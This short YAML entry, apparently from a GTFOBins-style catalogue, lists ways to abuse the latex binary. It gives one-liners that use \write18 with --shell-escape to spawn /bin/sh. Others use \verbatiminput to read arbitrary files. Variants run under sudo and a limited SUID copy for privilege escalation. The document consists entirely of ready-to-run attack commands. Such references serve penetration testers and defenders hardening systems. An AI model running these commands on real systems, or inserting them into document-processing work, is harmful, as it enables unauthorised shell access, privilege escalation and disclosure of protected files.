---
functions:
  shell:
    - code: |
        latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  file-read:
    - description: The read file will be part of the output.
      code: |
        latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        strings article.dvi
  sudo:
    - description: The read file will be part of the output.
      code: |
        sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        strings article.dvi
    - code: |
        sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  limited-suid:
    - code: |
        ./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
---
